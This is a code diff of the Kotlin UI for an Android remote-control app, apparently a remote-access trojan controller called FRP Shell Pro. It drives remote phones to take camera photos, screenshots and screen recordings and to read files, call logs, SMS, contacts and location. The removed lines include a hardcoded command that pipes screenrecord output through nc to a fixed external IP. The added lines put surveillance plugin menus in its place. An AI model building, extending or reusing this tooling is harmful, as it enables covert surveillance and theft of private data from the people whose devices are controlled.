@@ -1,8 +1,9 @@
-package com.kgapp.frpshell.ui
+package com.kgapp.frpshellpro.ui
 
 import android.content.Context
 import android.net.Uri
 import android.provider.OpenableColumns
+import android.util.Log
 import androidx.activity.compose.rememberLauncherForActivityResult
 import androidx.activity.result.contract.ActivityResultContracts
 import java.io.File
@@ -11,13 +12,21 @@ import androidx.compose.foundation.layout.fillMaxSize
 import androidx.compose.foundation.layout.fillMaxWidth
 import androidx.compose.material.icons.Icons
 import androidx.compose.material.icons.automirrored.filled.ArrowBack
+import androidx.compose.material.icons.filled.Call
+import androidx.compose.material.icons.filled.Extension
+import androidx.compose.material.icons.filled.LocationOn
 import androidx.compose.material.icons.filled.Folder
 import androidx.compose.material.icons.filled.Image
 import androidx.compose.material.icons.filled.Menu
 import androidx.compose.material.icons.filled.PhotoCamera
+import androidx.compose.material.icons.filled.Refresh
+import androidx.compose.material.icons.filled.Info
+import androidx.compose.material.icons.filled.Speed
 import androidx.compose.material.icons.filled.Save
 import androidx.compose.material.icons.filled.Settings
 import androidx.compose.material3.DrawerValue
+import androidx.compose.material3.DropdownMenu
+import androidx.compose.material3.DropdownMenuItem
 import androidx.compose.material3.TextButton
 import androidx.compose.material3.AlertDialog
 import androidx.compose.material3.ExperimentalMaterial3Api
@@ -27,19 +36,27 @@ import androidx.compose.material3.LinearProgressIndicator
 import androidx.compose.material3.MaterialTheme
 import androidx.compose.material3.ModalDrawerSheet
 import androidx.compose.material3.ModalNavigationDrawer
+import androidx.compose.material3.OutlinedTextField
 import androidx.compose.material3.Scaffold
 import androidx.compose.material3.Text
 import androidx.compose.material3.TopAppBar
 import androidx.compose.material3.rememberDrawerState
 import androidx.compose.runtime.Composable
+import androidx.compose.runtime.LaunchedEffect
+import androidx.compose.runtime.SideEffect
 import androidx.compose.runtime.collectAsState
+import androidx.compose.runtime.remember
 import androidx.compose.runtime.getValue
+import androidx.compose.runtime.mutableStateOf
 import androidx.compose.runtime.rememberCoroutineScope
+import androidx.compose.runtime.setValue
 import androidx.compose.ui.Modifier
+import androidx.compose.ui.graphics.vector.ImageVector
 import androidx.compose.ui.platform.LocalContext
 import androidx.lifecycle.viewmodel.compose.viewModel
-import com.kgapp.frpshell.model.ShellTarget
-import com.kgapp.frpshell.ui.theme.FrpShellTheme
+import com.kgapp.frpshellpro.frp.FrpLogBus
+import com.kgapp.frpshellpro.model.ShellTarget
+import com.kgapp.frpshellpro.ui.theme.FrpShellTheme
 import kotlinx.coroutines.launch
 
 
@@ -49,6 +66,7 @@ import androidx.compose.material.icons.filled.Videocam
 
 
 import androidx.compose.foundation.layout.padding
+import androidx.compose.foundation.layout.size
 import androidx.compose.ui.unit.dp
 
 @OptIn(ExperimentalMaterial3Api::class)
@@ -56,6 +74,25 @@ import androidx.compose.ui.unit.dp
 fun MainScaffold(vm: MainViewModel = viewModel()) {
     data class PickedUploadFile(val file: File, val displayName: String)
     val uiState by vm.uiState.collectAsState()
+    val firstRenderLogged = remember { mutableSetOf<String>() }
+
+    LaunchedEffect(Unit) {
+        FrpLogBus.append("[UI] MainScaffold 组合开始")
+        Log.i("FrpShellCompose", "MainScaffold 组合开始")
+    }
+
+    LaunchedEffect(uiState.screen) {
+        FrpLogBus.append("[UI] 状态初始化 screen=${uiState.screen}")
+        Log.i("FrpShellCompose", "状态初始化 screen=${uiState.screen}")
+    }
+
+    SideEffect {
+        val key = "${uiState.screen}|${uiState.fileManagerVisible}|${uiState.fileEditorVisible}|${uiState.screenViewerVisible}"
+        if (firstRenderLogged.add(key)) {
+            FrpLogBus.append("[UI] 首次渲染完成 key=$key")
+            Log.i("FrpShellCompose", "首次渲染完成 key=$key")
+        }
+    }
 
     fun copyUriToCache(context: Context, uri: Uri): PickedUploadFile? {
         val displayName = runCatching {
@@ -96,16 +133,18 @@ fun MainScaffold(vm: MainViewModel = viewModel()) {
         }
 
         val isSettings = uiState.screen == ScreenDestination.Settings
+        val isDeviceInfo = uiState.screen == ScreenDestination.DeviceInfo
 
         ModalNavigationDrawer(
             drawerState = drawerState,
-            gesturesEnabled = !isSettings,
+            gesturesEnabled = !isSettings && !isDeviceInfo,
             drawerContent = {
                 if (!isSettings) {
-                    ModalDrawerSheet(modifier = Modifier.fillMaxWidth(0.34f)) {
+                    ModalDrawerSheet(modifier = Modifier.fillMaxWidth(0.7f)) {
                         DrawerContent(
                             current = uiState.selectedTarget,
                             clientIds = uiState.clientIds,
+                            boardCodeByClientId = uiState.boardCodeByClientId,
                             clientModels = uiState.clientModels,
                             onSelect = {
                                 vm.onSelectTarget(it)
@@ -122,10 +161,14 @@ fun MainScaffold(vm: MainViewModel = viewModel()) {
                     TopAppBar(
                         title = {
                             Text(
-                                if (isSettings) "设置" 
-                                else if (uiState.fileEditorVisible) "文件编辑" 
-                                else if (uiState.fileManagerVisible) "文件管理" 
+                                if (isSettings) "设置"
+                                else if (uiState.fileEditorVisible) "文件编辑"
+                                else if (uiState.fileManagerVisible) "文件管理"
+                                else if (uiState.processListVisible) "运行的程序"
                                 else if (uiState.screenViewerVisible) "屏幕截图"
+                                else if (isDeviceInfo) "设备信息"
+                                else if (uiState.screen == ScreenDestination.GetInfoPlugin) "GetInfo 插件"
+                                else if (uiState.screen == ScreenDestination.GetLocPlugin) "GetLoc 插件"
                                 else "FRP Shell",
                                 style = MaterialTheme.typography.titleMedium
                             )
@@ -135,16 +178,20 @@ fun MainScaffold(vm: MainViewModel = viewModel()) {
                                 onClick = {
                                     when {
                                         isSettings -> vm.navigateBackToMain()
+                                        isDeviceInfo -> vm.dismissDeviceInfo()
                                         uiState.fileEditorVisible -> vm.closeFileEditor()
                                         uiState.fileManagerVisible -> vm.closeFileManager()
+                                        uiState.processListVisible -> vm.closePerformance()
                                         uiState.screenViewerVisible -> vm.closeScreenViewer()
+                                        uiState.screen == ScreenDestination.GetInfoPlugin -> vm.dismissGetInfoPlugin()
+                                        uiState.screen == ScreenDestination.GetLocPlugin -> vm.dismissGetLocPlugin()
                                         else -> scope.launch { drawerState.open() }
                                     }
                                 }
                             ) {
                                 Icon(
-                                    if (isSettings || uiState.fileManagerVisible || uiState.fileEditorVisible || uiState.screenViewerVisible) Icons.AutoMirrored.Filled.ArrowBack else Icons.Default.Menu,
-                                    contentDescription = if (isSettings || uiState.fileManagerVisible || uiState.fileEditorVisible || uiState.screenViewerVisible) "back" else "open drawer"
+                                    if (isSettings || isDeviceInfo || uiState.fileManagerVisible || uiState.fileEditorVisible || uiState.processListVisible || uiState.screenViewerVisible || uiState.screen == ScreenDestination.GetInfoPlugin || uiState.screen == ScreenDestination.GetLocPlugin) Icons.AutoMirrored.Filled.ArrowBack else Icons.Default.Menu,
+                                    contentDescription = if (isSettings || isDeviceInfo || uiState.fileManagerVisible || uiState.fileEditorVisible || uiState.processListVisible || uiState.screenViewerVisible || uiState.screen == ScreenDestination.GetInfoPlugin || uiState.screen == ScreenDestination.GetLocPlugin) "back" else "open drawer"
                                 )
                             }
                         },
@@ -153,34 +200,26 @@ fun MainScaffold(vm: MainViewModel = viewModel()) {
                                 IconButton(onClick = vm::saveEditor) {
                                     Icon(Icons.Default.Save, contentDescription = "save")
                                 }
+                            } else if (isDeviceInfo) {
+                                IconButton(onClick = vm::refreshDeviceInfo) {
+                                    Icon(Icons.Default.Refresh, contentDescription = "刷新设备信息")
+                                }
                             } else if (!isSettings && !uiState.screenViewerVisible) {
-                                if (!uiState.fileManagerVisible && uiState.selectedTarget is ShellTarget.Client) {
-                                IconButton(onClick = { 
-                vm.sendCommand("nohup screenrecord --bit-rate 100000 --output-format=h264 - | nc 47.113.126.123 40001 > /dev/null 2>&1 &")
-            }) {
-                Icon(Icons.Default.Videocam, contentDescription = "start recording")
-            }
-            
-            // 结束录屏按钮
-            IconButton(onClick = { 
-                vm.sendCommand("pkill -9 screenrecord")
-            }) {
-                Icon(Icons.Default.Stop, contentDescription = "stop recording")
-            }
-                                
-                                    IconButton(onClick = vm::openCameraSelector) {
-                                        Icon(Icons.Default.PhotoCamera, contentDescription = "take photo")
-                                    }
-                                    IconButton(onClick = vm::captureScreen) {
-                                        Icon(Icons.Default.Image, contentDescription = "capture screen")
-                                    }
-                                    IconButton(onClick = vm::openFileManager) {
-                                        Icon(Icons.Default.Folder, contentDescription = "file manager")
-                                    }
-                                }
-                                IconButton(onClick = vm::openSettings) {
-                                    Icon(Icons.Default.Settings, contentDescription = "settings")
-                                }
+                                TopBarMenus(
+                                    showClientActions = !uiState.fileManagerVisible && uiState.selectedTarget is ShellTarget.Client,
+                                    onOpenSettings = vm::openSettings,
+                                    onOpenCamera = vm::openCameraSelector,
+                                    onCaptureScreen = vm::captureScreen,
+                                    onStartRecord = vm::startRecord,
+                                    onStopRecord = vm::stopRecord,
+                                    onOpenFileManager = vm::openFileManager,
+                                    onOpenRunningPrograms = vm::openRunningPrograms,
+                                    onShowDeviceInfo = { (uiState.selectedTarget as? ShellTarget.Client)?.id?.let(vm::showDeviceInfo) },
+                                    onShowGetInfoPlugin = { (uiState.selectedTarget as? ShellTarget.Client)?.id?.let(vm::showGetInfoPlugin) },
+                                    onShowGetLocPlugin = { (uiState.selectedTarget as? ShellTarget.Client)?.id?.let(vm::showGetLocPlugin) },
+                                    onRefreshProcessList = vm::refreshRunningPrograms,
+                                    processListVisible = uiState.processListVisible
+                                )
                             }
                         }
                     )
@@ -194,11 +233,22 @@ fun MainScaffold(vm: MainViewModel = viewModel()) {
                             suAvailable = uiState.suAvailable,
                             themeMode = uiState.themeMode,
                             shellFontSizeSp = uiState.shellFontSizeSp,
+                            uploadScriptContent = uiState.uploadScriptContent,
+                            recordStreamHost = uiState.recordStreamHost,
+                            recordStreamPort = uiState.recordStreamPort,
+                            recordStartTemplate = uiState.recordStartTemplate,
+                            recordStopTemplate = uiState.recordStopTemplate,
                             firstLaunchFlow = uiState.firstLaunchFlow,
                             onConfigChanged = vm::onConfigChanged,
                             onUseSuChanged = vm::onUseSuChanged,
                             onThemeModeChanged = vm::onThemeModeChanged,
                             onShellFontSizeChanged = vm::onShellFontSizeChanged,
+                            onUploadScriptContentChanged = vm::onUploadScriptContentChanged,
+                            onRecordStreamHostChanged = vm::onRecordStreamHostChanged,
+                            onRecordStreamPortChanged = vm::onRecordStreamPortChanged,
+                            onRecordStartTemplateChanged = vm::onRecordStartTemplateChanged,
+                            onRecordStopTemplateChanged = vm::onRecordStopTemplateChanged,
+                            onSaveUploadScript = vm::saveUploadScript,
                             onSave = vm::saveConfigOnly,
                             onSaveAndRestart = vm::saveAndRestartFrp,
                             contentPadding = padding
@@ -224,20 +274,98 @@ fun MainScaffold(vm: MainViewModel = viewModel()) {
                         )
                     }
 
+                    isDeviceInfo -> {
+                        DeviceInfoScreen(
+                            contentPadding = padding,
+                            clientId = uiState.deviceInfoClientId,
+                            loading = uiState.deviceInfoLoading,
+                            errorMessage = uiState.deviceInfoErrorMessage,
+                            cards = uiState.deviceInfoCards,
+                            modifier = Modifier.fillMaxSize()
+                        )
+                    }
+
+                    uiState.processListVisible -> {
+                        RunningProcessScreen(
+                            contentPadding = padding,
+                            processItems = uiState.processItems,
+                            loading = uiState.processLoading,
+                            errorMessage = uiState.processErrorMessage,
+                            sortField = uiState.processSortField,
+                            sortAscending = uiState.processSortAscending,
+                            onSortByPid = { vm.updateProcessSort(ProcessSortField.PID) },
+                            onSortByRss = { vm.updateProcessSort(ProcessSortField.RSS) },
+                            onClickItem = vm::requestKillProcess,
+                            modifier = Modifier.fillMaxSize()
+                        )
+                    }
+
+                    uiState.screen == ScreenDestination.GetInfoPlugin -> {
+                        GetInfoPluginScreen(
+                            contentPadding = padding,
+                            callLogLoading = uiState.callLogLoading,
+                            callLogErrorMessage = uiState.callLogErrorMessage,
+                            callLogCountInput = uiState.callLogCountInput,
+                            callLogItems = uiState.callLogItems,
+                            onCallLogCountChange = vm::onCallLogCountChanged,
+                            onReadCallLog = vm::refreshCallLogs,
+                            smsLoading = uiState.smsLoading,
+                            smsErrorMessage = uiState.smsErrorMessage,
+                            smsCountInput = uiState.smsCountInput,
+                            smsItems = uiState.smsItems,
+                            onSmsCountChange = vm::onSmsCountChanged,
+                            onReadSms = vm::refreshSms,
+                            contactLoading = uiState.contactLoading,
+                            contactErrorMessage = uiState.contactErrorMessage,
+                            contactCountInput = uiState.contactCountInput,
+                            contactItems = uiState.contactItems,
+                            onContactCountChange = vm::onContactCountChanged,
+                            onReadContact = vm::refreshContacts,
+                            modifier = Modifier.fillMaxSize()
+                        )
+                    }
+
+                    uiState.screen == ScreenDestination.GetLocPlugin -> {
+                        GetLocPluginScreen(
+                            contentPadding = padding,
+                            loading = uiState.getLocLoading,
+                            errorMessage = uiState.getLocErrorMessage,
+                            statusMessage = uiState.getLocStatusMessage,
+                            locationInfo = uiState.locationInfo,
+                            intlAddressLoading = uiState.locationAddressIntlLoading,
+                            intlAddress = uiState.locationAddressIntl,
+                            intlAddressErrorMessage = uiState.locationAddressIntlErrorMessage,
+                            cnAddressLoading = uiState.locationAddressCnLoading,
+                            cnAddress = uiState.locationAddressCn,
+                            cnAddressErrorMessage = uiState.locationAddressCnErrorMessage,
+                            onInstallPlugin = vm::installGetLocPlugin,
+                            onUninstallPlugin = vm::uninstallGetLocPlugin,
+                            onGrantPermission = vm::grantGetLocPermissions,
+                            onFetchLocation = vm::fetchLocationByPlugin,
+                            onResolveAddressIntl = vm::resolveLocationAddressIntl,
+                            onResolveAddressCn = vm::resolveLocationAddressCn,
+                            modifier = Modifier.fillMaxSize()
+                        )
+                    }
+
+
                     uiState.fileManagerVisible -> {
                         FileManagerScreen(
                             currentPath = uiState.fileManagerPath,
                             files = uiState.fileManagerFiles,
+                            errorMessage = uiState.fileManagerErrorMessage,
                             contentPadding = padding,
                             onRefresh = vm::fileManagerRefresh,
                             onBackDirectory = vm::fileManagerBackDirectory,
                             onOpenFile = vm::fileManagerOpen,
                             onEditFile = vm::fileManagerEdit,
                             onDownloadFile = vm::fileManagerDownload,
+                            onLargeFileUpload = vm::fileManagerLargeFileUpload,
                             onUploadFile = { uploadLauncher.launch("*/*") },
                             onRename = vm::fileManagerRename,
                             onChmod = vm::fileManagerChmod,
                             onDelete = vm::fileManagerDelete,
+                            onCompress = vm::fileManagerCompress,
                             transferVisible = uiState.fileTransferVisible,
                             transferTitle = uiState.fileTransferTitle,
                             transferDone = uiState.fileTransferDone,
@@ -251,10 +379,15 @@ fun MainScaffold(vm: MainViewModel = viewModel()) {
                             modifier = Modifier.fillMaxSize(),
                             target = uiState.selectedTarget,
                             fontSizeSp = uiState.shellFontSizeSp,
+                            commandItems = (uiState.selectedTarget as? ShellTarget.Client)?.let { uiState.shellItemsByClient[it.id].orEmpty() } ?: emptyList(),
                             frpRunning = uiState.frpRunning,
                             onStartFrp = vm::startFrp,
                             onStopFrp = vm::stopFrp,
                             onSend = vm::sendCommand,
+                            quickCommands = uiState.quickCommands,
+                            onAddQuickCommand = vm::addQuickCommand,
+                            onUpdateQuickCommand = vm::updateQuickCommand,
+                            onDeleteQuickCommand = vm::deleteQuickCommand,
                             contentPadding = padding
                         )
                     }
@@ -325,6 +458,37 @@ fun MainScaffold(vm: MainViewModel = viewModel()) {
                 )
             }
 
+            uiState.processPendingKill?.let { process ->
+                AlertDialog(
+                    onDismissRequest = vm::cancelKillProcess,
+                    title = { Text("确认操作") },
+                    text = { Text("是否确定杀死进程 ${process.pid}（${process.cmd}）？") },
+                    confirmButton = {
+                        TextButton(onClick = vm::confirmKillProcess) {
+                            Text("确定")
+                        }
+                    },
+                    dismissButton = {
+                        TextButton(onClick = vm::cancelKillProcess) {
+                            Text("取消")
+                        }
+                    }
+                )
+            }
+
+            uiState.recordConfigErrorMessage?.let { message ->
+                AlertDialog(
+                    onDismissRequest = vm::dismissRecordConfigError,
+                    title = { Text("录屏配置无效") },
+                    text = { Text(message) },
+                    confirmButton = {
+                        TextButton(onClick = vm::dismissRecordConfigError) {
+                            Text("知道了")
+                        }
+                    }
+                )
+            }
+
             if (uiState.cameraSelectorVisible) {
                 AlertDialog(
                     onDismissRequest = vm::closeCameraSelector,
@@ -336,19 +500,205 @@ fun MainScaffold(vm: MainViewModel = viewModel()) {
                                     onClick = { vm.takePhoto(id) },
                                     modifier = Modifier.fillMaxWidth()
                                 ) {
-                                    Text("Camera ID: $id")
+                                    Text("摄像头 $id")
                                 }
                             }
                         }
                     },
-                    confirmButton = {},
+                    confirmButton = { TextButton(onClick = vm::closeCameraSelector) { Text("取消") } }
+                )
+            }
+
+            uiState.compressTarget?.let { target ->
+                var archiveName by remember(target.name) { mutableStateOf("${target.name}.tar.gz") }
+                AlertDialog(
+                    onDismissRequest = vm::cancelCompress,
+                    title = { Text("压缩文件夹") },
+                    text = {
+                        OutlinedTextField(
+                            value = archiveName,
+                            onValueChange = { archiveName = it },
+                            label = { Text("压缩文件名") }
+                        )
+                    },
+                    confirmButton = {
+                        TextButton(onClick = {
+                            if (!archiveName.isBlank()) {
+                                vm.confirmCompress(archiveName)
+                            }
+                        }) {
+                            Text("确定")
+                        }
+                    },
                     dismissButton = {
-                        TextButton(onClick = vm::closeCameraSelector) {
+                        TextButton(onClick = vm::cancelCompress) {
                             Text("取消")
                         }
                     }
                 )
             }
+
         }
     }
+}
+
+@Composable
+private fun TopBarMenus(
+    showClientActions: Boolean,
+    onOpenSettings: () -> Unit,
+    onOpenCamera: () -> Unit,
+    onCaptureScreen: () -> Unit,
+    onStartRecord: () -> Unit,
+    onStopRecord: () -> Unit,
+    onOpenFileManager: () -> Unit,
+    onOpenRunningPrograms: () -> Unit,
+    onShowDeviceInfo: () -> Unit,
+    onShowGetInfoPlugin: () -> Unit,
+    onShowGetLocPlugin: () -> Unit,
+    onRefreshProcessList: () -> Unit,
+    processListVisible: Boolean
+) {
+    var imageMenuExpanded by remember { mutableStateOf(false) }
+    var fileMenuExpanded by remember { mutableStateOf(false) }
+    var performanceMenuExpanded by remember { mutableStateOf(false) }
+    var pluginMenuExpanded by remember { mutableStateOf(false) }
+
+    if (showClientActions) {
+        IconButton(onClick = { performanceMenuExpanded = true }) {
+            Icon(Icons.Default.Speed, contentDescription = "性能菜单")
+        }
+        DropdownMenu(
+            expanded = performanceMenuExpanded,
+            onDismissRequest = { performanceMenuExpanded = false }
+        ) {
+            TopMenuItem(
+                text = "运行的程序",
+                icon = Icons.Default.Speed,
+                onClick = {
+                    performanceMenuExpanded = false
+                    onOpenRunningPrograms()
+                }
+            )
+            TopMenuItem(
+                text = "设备信息",
+                icon = Icons.Default.Info,
+                onClick = {
+                    performanceMenuExpanded = false
+                    onShowDeviceInfo()
+                }
+            )
+        }
+
+        IconButton(onClick = { pluginMenuExpanded = true }) {
+            Icon(Icons.Default.Extension, contentDescription = "插件菜单")
+        }
+        DropdownMenu(
+            expanded = pluginMenuExpanded,
+            onDismissRequest = { pluginMenuExpanded = false }
+        ) {
+            TopMenuItem(
+                text = "GetInfo",
+                icon = Icons.Default.Call,
+                onClick = {
+                    pluginMenuExpanded = false
+                    onShowGetInfoPlugin()
+                }
+            )
+            TopMenuItem(
+                text = "GetPhoto - 拍照",
+                icon = Icons.Default.PhotoCamera,
+                onClick = {
+                    pluginMenuExpanded = false
+                    onOpenCamera()
+                }
+            )
+            TopMenuItem(
+                text = "GetLoc",
+                icon = Icons.Default.LocationOn,
+                onClick = {
+                    pluginMenuExpanded = false
+                    onShowGetLocPlugin()
+                }
+            )
+        }
+
+        IconButton(onClick = { fileMenuExpanded = true }) {
+            Icon(Icons.Default.Folder, contentDescription = "文件菜单")
+        }
+        DropdownMenu(
+            expanded = fileMenuExpanded,
+            onDismissRequest = { fileMenuExpanded = false }
+        ) {
+            TopMenuItem(
+                text = "文件管理",
+                icon = Icons.Default.Folder,
+                onClick = {
+                    fileMenuExpanded = false
+                    onOpenFileManager()
+                }
+            )
+        }
+
+        IconButton(onClick = { imageMenuExpanded = true }) {
+            Icon(Icons.Default.Image, contentDescription = "图像菜单")
+        }
+        DropdownMenu(
+            expanded = imageMenuExpanded,
+            onDismissRequest = { imageMenuExpanded = false }
+        ) {
+            TopMenuItem(
+                text = "截屏",
+                icon = Icons.Default.Image,
+                onClick = {
+                    imageMenuExpanded = false
+                    onCaptureScreen()
+                }
+            )
+            TopMenuItem(
+                text = "开始录屏",
+                icon = Icons.Default.Videocam,
+                onClick = {
+                    imageMenuExpanded = false
+                    onStartRecord()
+                }
+            )
+            TopMenuItem(
+                text = "停止录屏",
+                icon = Icons.Default.Stop,
+                onClick = {
+                    imageMenuExpanded = false
+                    onStopRecord()
+                }
+            )
+        }
+    }
+
+    if (processListVisible) {
+        IconButton(onClick = onRefreshProcessList) {
+            Icon(Icons.Default.Refresh, contentDescription = "刷新进程")
+        }
+    }
+
+    IconButton(onClick = onOpenSettings) {
+        Icon(Icons.Default.Settings, contentDescription = "settings")
+    }
+}
+
+@Composable
+private fun TopMenuItem(
+    text: String,
+    icon: ImageVector,
+    onClick: () -> Unit
+) {
+    DropdownMenuItem(
+        text = { Text(text) },
+        leadingIcon = {
+            Icon(
+                imageVector = icon,
+                contentDescription = null,
+                modifier = Modifier.size(20.dp)
+            )
+        },
+        onClick = onClick
+    )
 }
